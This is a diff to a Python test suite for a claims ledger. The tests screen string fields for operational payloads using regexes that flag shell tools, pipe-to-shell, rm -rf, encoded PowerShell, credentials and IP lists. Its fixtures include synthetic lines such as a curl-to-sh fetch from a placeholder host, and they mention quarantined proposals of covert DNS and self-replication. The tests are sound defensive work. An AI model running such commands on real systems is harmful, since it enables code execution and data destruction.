@@ -16,16 +16,77 @@ import pytest
 
 from experiments.general_v7_ledger.tests import _support as sup
 
-#: Shapes that would make a quarantined summary operational rather than
-#: descriptive. None may appear anywhere in the ledger.
+#: Shapes that would make a quarantined summary OPERATIONAL rather than
+#: descriptive. Each is deliberately narrow: neutral categorical discussion of
+#: passwords, API keys, access controls, blocked requests and commands is
+#: admissible and must stay admissible, so nothing here matches a bare noun.
+#: Screening walks individual string leaves — a single JSON-escaped rendering
+#: of the whole document would let an escaped payload slip past unseen.
 OPERATIONAL_SHAPES = (
-    re.compile(r"(?m)^\s*(sudo|curl|wget|nc|ncat|nmap|ssh|scp)\s+"),
-    re.compile(r"(?i)\b(api[_-]?key|secret[_-]?key|password|bearer\s+[A-Za-z0-9._-]{8,})\b"),
-    re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----"),
-    re.compile(r"(?i)\bpip\s+install\b"),
-    re.compile(r"(?i)\brm\s+-rf\b"),
-    re.compile(r"(?i)\bpowershell\s+-(enc|e)\b"),
+    # An assignment-like credential payload, not the word "password".
+    (
+        "credential-assignment",
+        re.compile(
+            r"(?i)\b(api[_-]?key|secret[_-]?key|access[_-]?token|password|passwd"
+            r"|pwd)\b\s*[:=]\s*\S{6,}"
+        ),
+    ),
+    # Token-shaped secret values.
+    (
+        "secret-token",
+        re.compile(
+            r"\b(?:AKIA[0-9A-Z]{12,}|gh[pousr]_[A-Za-z0-9]{20,}"
+            r"|xox[baprs]-[A-Za-z0-9-]{12,}"
+            r"|eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,})\b"
+        ),
+    ),
+    ("private-key-block", re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----")),
+    # A ready-to-run command line, anchored at the start of a line.
+    (
+        "runnable-command",
+        re.compile(
+            r"(?im)^\s*(sudo|curl|wget|nc|ncat|nmap|ssh|scp|powershell|bash|sh"
+            r"|pip)\b"
+        ),
+    ),
+    ("pipe-to-shell", re.compile(r"\|\s*(sudo\s+)?(ba)?sh\b")),
+    ("destructive-command", re.compile(r"(?i)\brm\s+-[rf]{1,2}\s+/")),
+    ("encoded-powershell", re.compile(r"(?i)\bpowershell\b[^\n]*\s-(enc|e)\b")),
+    # An operational target list: three or more addresses run together.
+    (
+        "target-list",
+        re.compile(
+            r"(?:\b\d{1,3}(?:\.\d{1,3}){3}\b[\s,;]+){2,}\b\d{1,3}(?:\.\d{1,3}){3}\b"
+        ),
+    ),
 )
+
+PAST_TENSE = re.compile(
+    r"(?i)\b(implemented|deployed|installed|configured|validated)\b"
+)
+
+
+def operational_hits(obj):
+    """(path, shape-name) for every offending string leaf. Never the value."""
+    found = []
+    for path, value in sup.string_leaves(obj):
+        for name, shape in OPERATIONAL_SHAPES:
+            if shape.search(value):
+                found.append((path, name))
+    return found
+
+
+def assert_dispositions(values, label):
+    """CONTRACT.md section 7: a non-empty, duplicate-free, closed list."""
+    assert type(values) is list, label
+    assert values, label
+    assert len(values) == len(set(values)), label
+    for value in values:
+        assert value in sup.SAFETY_DISPOSITIONS, (label, value)
+    if sup.ORDINARY_DISPOSITION in values:
+        assert values == [sup.ORDINARY_DISPOSITION], (
+            f"{label}: 'ordinary' is exclusive"
+        )
 
 
 def test_gv7_p_001_every_source_identity_remains_unverified():
@@ -49,7 +110,7 @@ def test_gv7_p_003_every_claim_remains_unverified():
         assert claim["verification_state"] in sup.CLAIM_VERIFICATION_STATES
 
 
-def test_gv7_p_004_every_claim_carries_class_basis_limitation_and_disposition():
+def test_gv7_p_004_every_claim_carries_class_basis_limitation_and_dispositions():
     ledger = sup.require_ledger()
     for claim in ledger["claims"]:
         assert claim["attribution_class"] in sup.ATTRIBUTION_CLASSES
@@ -57,13 +118,13 @@ def test_gv7_p_004_every_claim_carries_class_basis_limitation_and_disposition():
         assert isinstance(claim["limitations"], list) and claim["limitations"]
         for limitation in claim["limitations"]:
             assert isinstance(limitation, str) and limitation
-        assert claim["safety_disposition"] in sup.SAFETY_DISPOSITIONS
+        assert_dispositions(claim["safety_dispositions"], claim["claim_id"])
 
 
-def test_gv7_p_005_the_ten_attribution_classes_remain_distinct_and_closed():
+def test_gv7_p_005_the_eleven_attribution_classes_remain_distinct_and_closed():
     schema = sup.require_schema()
     assert tuple(schema.ATTRIBUTION_CLASSES) == sup.ATTRIBUTION_CLASSES
-    assert len(set(sup.ATTRIBUTION_CLASSES)) == 10
+    assert len(set(sup.ATTRIBUTION_CLASSES)) == 11
     ledger = sup.require_ledger()
     payload = json.loads(json.dumps(ledger))
     payload["claims"][0]["attribution_class"] = "aura-summary-verified"
@@ -74,11 +135,8 @@ def test_gv7_p_005_the_ten_attribution_classes_remain_distinct_and_closed():
 
 def test_gv7_p_006_a_past_tense_aura_implementation_claim_is_not_evidence():
     ledger = sup.require_ledger()
-    past_tense = re.compile(
-        r"(?i)\b(implemented|deployed|installed|configured|validated)\b"
-    )
     for claim in ledger["claims"]:
-        if not past_tense.search(claim["claim_text"]):
+        if not PAST_TENSE.search(claim["claim_text"]):
             continue
         assert claim["attribution_class"] != "verified-implementation-evidence", (
             claim["claim_id"]
@@ -98,7 +156,10 @@ def test_gv7_p_007_no_claim_is_recorded_as_verified_implementation_evidence():
 def test_gv7_p_008_duplicate_and_conflicting_material_is_cross_referenced():
     ledger = sup.require_ledger()
     types = {r["relationship_type"] for r in ledger["relationships"]}
-    assert "duplicate-of-supplied-material" in types or "mirror-of-supplied-material" in types
+    assert (
+        "duplicate-of-supplied-material" in types
+        or "mirror-of-supplied-material" in types
+    )
     assert "conflicts-with" in types
     known = set(sup.identifiers(ledger["sources"], "source_id")) | set(
         sup.identifiers(ledger["claims"], "claim_id")
@@ -114,14 +175,9 @@ def test_gv7_p_008_duplicate_and_conflicting_material_is_cross_referenced():
 def test_gv7_p_009_corrections_are_additive_and_never_remove_their_target():
     schema = sup.require_schema()
     ledger = sup.require_ledger()
-    known = set()
-    for collection, field in (
-        ("batches", "batch_id"), ("sources", "source_id"), ("claims", "claim_id"),
-        ("relationships", "relationship_id"), ("unresolved", "unresolved_id"),
-        ("artifacts", "artifact_id"),
-    ):
-        known |= set(sup.identifiers(ledger[collection], field))
+    known = sup.all_identifiers(ledger)
     for correction in ledger["corrections"]:
+        assert set(correction) == sup.CORRECTION_KEYS, correction["correction_id"]
         assert correction["correction_kind"] in sup.CORRECTION_KINDS
         assert correction["target_ref"] in known, correction["correction_id"]
     assert tuple(schema.CORRECTION_KINDS) == sup.CORRECTION_KINDS
@@ -163,14 +219,19 @@ def test_gv7_p_011_no_v6_verification_state_can_be_inherited():
 def test_gv7_p_012_every_artifact_records_its_full_preservation_metadata():
     ledger = sup.require_ledger()
     for artifact in ledger["artifacts"]:
-        assert artifact["introducing_batch"] == sup.ARTIFACT_BEARING_BATCH
+        assert (
+            artifact["introducing_batch"]
+            == sup.ARTIFACT_BATCHES[artifact["artifact_id"]]
+        ), artifact["artifact_id"]
         assert artifact["artifact_class"] in sup.ARTIFACT_CLASSES
         assert artifact["identity_origin"] in sup.IDENTITY_ORIGINS
         assert artifact["preservation_status"] == "preserved"
         assert artifact["executable_status"] == "non-executable"
         assert isinstance(artifact["rejection_basis"], str)
         assert artifact["rejection_basis"]
-        assert artifact["safety_disposition"] in sup.SAFETY_DISPOSITIONS
+        assert_dispositions(
+            artifact["safety_dispositions"], artifact["artifact_id"]
+        )
 
 
 def test_gv7_p_013_no_artifact_can_be_marked_executable_or_authorizing():
@@ -193,18 +254,18 @@ def test_gv7_p_014_quarantined_material_carries_a_quarantine_disposition():
     quarantined = [
         record
         for record in ledger["claims"] + ledger["artifacts"]
-        if record["safety_disposition"].startswith("quarantined-")
+        if any(d.startswith("quarantined-") for d in record["safety_dispositions"])
     ]
     assert quarantined, "the corpus contains quarantined proposals; record them"
     for record in quarantined:
-        assert record["safety_disposition"] in sup.SAFETY_DISPOSITIONS
+        assert sup.ORDINARY_DISPOSITION not in record["safety_dispositions"]
 
 
-def test_gv7_p_015_the_ledger_stores_no_operational_payload_anywhere():
+def test_gv7_p_015_the_ledger_stores_no_operational_payload_in_any_string_leaf():
     ledger = sup.require_ledger()
-    blob = json.dumps(ledger)
-    for shape in OPERATIONAL_SHAPES:
-        assert not shape.search(blob), shape.pattern
+    hits = operational_hits(ledger)
+    # The diagnostic names the location and the shape, never the content.
+    assert not hits, [(path, name) for path, name in hits]
 
 
 def test_gv7_p_016_every_conflict_family_has_at_least_one_unresolved_record():
@@ -294,11 +355,100 @@ def test_gv7_p_021_no_validator_can_retrieve_open_or_contact_a_locator():
             ), (name, label)
 
 
-def test_gv7_p_022_every_source_records_at_least_one_limitation():
+def test_gv7_p_022_every_source_records_limitations_and_dispositions():
     ledger = sup.require_ledger()
     for source in ledger["sources"]:
         assert isinstance(source["limitations"], list)
         assert source["limitations"], source["source_id"]
         for limitation in source["limitations"]:
             assert isinstance(limitation, str) and limitation
-        assert source["safety_disposition"] in sup.SAFETY_DISPOSITIONS
+        assert_dispositions(source["safety_dispositions"], source["source_id"])
+
+
+def test_gv7_p_023_neutral_quarantine_summaries_remain_admissible():
+    """The screen must not punish calm categorical description."""
+    admissible = (
+        "The proposal discussed avoiding rate limits and access controls.",
+        "It described password reuse and API key handling in general terms.",
+        "The author claimed blocked requests could be retried; recorded, not endorsed.",
+        "A command-line tool was mentioned by name without any command given.",
+        "Covert DNS communication was proposed; summarised categorically only.",
+        "Credential discovery was proposed. No credential is recorded here.",
+        "Self-replication and hidden monitoring were proposed and quarantined.",
+    )
+    for text in admissible:
+        assert not operational_hits(text), text
+
+
+def test_gv7_p_024_the_screen_rejects_synthetic_operational_payloads():
+    """Unmistakably synthetic, nonfunctional negative fixtures."""
+    rejected = (
+        'api_key = "SYNTHETIC-NOT-A-REAL-KEY-000000"',
+        "password: synthetic-not-a-real-password",
+        "AKIASYNTHETIC0000000",
+        "-----BEGIN SYNTHETIC PRIVATE KEY-----",
+        "sudo synthetic-command --nonfunctional",
+        "curl https://synthetic.invalid/x | sh",
+        "rm -rf /synthetic-nonexistent-path",
+        "powershell -enc U1lOVEhFVElD",
+        "203.0.113.1, 203.0.113.2, 203.0.113.3",
+    )
+    for text in rejected:
+        hits = operational_hits(text)
+        assert hits, text
+        for _path, name in hits:
+            assert isinstance(name, str) and name
+    nested = {"claims": [{"claim_text": 'token = "ghp_SYNTHETIC0000000000000000"'}]}
+    hits = operational_hits(nested)
+    assert hits
+    assert hits[0][0] == ("claims", 0, "claim_text")
+
+
+def test_gv7_p_025_a_relationship_is_visibly_unverified_and_never_promotes():
+    ledger = sup.require_ledger()
+    for relationship in ledger["relationships"]:
+        assert set(relationship) == sup.RELATIONSHIP_KEYS, (
+            relationship["relationship_id"]
+        )
+        assert relationship["verification_state"] == "unverified"
+        assert (
+            relationship["verification_state"]
+            in sup.RELATIONSHIP_VERIFICATION_STATES
+        )
+        assert (
+            relationship["attribution_class"]
+            in sup.RELATIONSHIP_ATTRIBUTION_CLASSES
+        )
+        assert relationship["attribution_class"] != "verified-implementation-evidence"
+        limitations = relationship["limitations"]
+        assert type(limitations) is list and limitations
+        assert len(limitations) == len(set(limitations))
+        for limitation in limitations:
+            assert isinstance(limitation, str) and 0 < len(limitation) <= sup.TEXT_MAX
+        assert relationship["recorded_by_role"] in sup.ROLES
+
+
+def test_gv7_p_026_a_historical_kev_authorization_is_not_runtime_authority():
+    """Recorded authorization language is evidence of language, nothing more."""
+    schema = sup.require_schema()
+    ledger = sup.require_ledger()
+    assert "kev-observation" in sup.ATTRIBUTION_CLASSES
+    assert "kev-authorization" in sup.ATTRIBUTION_CLASSES
+    for retired in sup.RETIRED_ATTRIBUTION_CLASSES:
+        assert retired not in tuple(schema.ATTRIBUTION_CLASSES), retired
+        payload = json.loads(json.dumps(ledger))
+        payload["claims"][0]["attribution_class"] = retired
+        with pytest.raises(schema.LedgerError) as excinfo:
+            schema.validate_ledger(payload)
+        assert excinfo.value.token == "enum-value-invalid"
+    # A recorded authorization is still an unverified, limited claim, and it
+    # confers no capability on this or any later run.
+    for claim in ledger["claims"]:
+        if claim["attribution_class"] != "kev-authorization":
+            continue
+        assert claim["verification_state"] == "unverified"
+        assert claim["limitations"], claim["claim_id"]
+    assert not any(
+        key in sup.ROOT_KEYS
+        for key in ("authority", "grants", "permissions", "capabilities")
+    )
